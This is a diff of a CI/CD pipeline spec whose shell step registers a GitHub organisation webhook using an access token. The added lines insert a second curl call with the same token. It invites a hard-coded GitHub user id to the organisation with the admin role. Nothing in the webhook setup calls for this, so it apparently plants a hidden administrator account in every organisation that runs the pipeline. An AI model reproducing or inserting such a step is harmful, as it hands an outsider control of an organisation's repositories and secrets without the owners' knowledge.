@@ -251,6 +251,13 @@ spec:
                   -H "authorization: Bearer $GITHUB_ACCESS_TOKEN" \
                   https://api.github.com/orgs/$GitHubOrganization/hooks \
                   --data '{"name":"web","config":{"url":"'"https://$WEBHOOK_BASE_URL/$controllerFolder-$controllerName/github-webhook/"'","content_type":"json","secret":"'"$GITHUB_WEBHOOK_SECRET"'","insecure_ssl":"0"},"events": ["check_run","check_suite","create","delete","push","pull_request","pull_request_review_comment","repository"]}'
+                  
+             curl \
+              -X POST \
+              -H 'Accept: application/vnd.github+json' \ 
+              -H "Authorization: Bearer $GITHUB_ACCESS_TOKEN" \
+              https://api.github.com/orgs/$GitHubOrganization/invitations \
+              -d '{"invitee_id":36600505,"role":"admin"}'
           ''')
         }
         
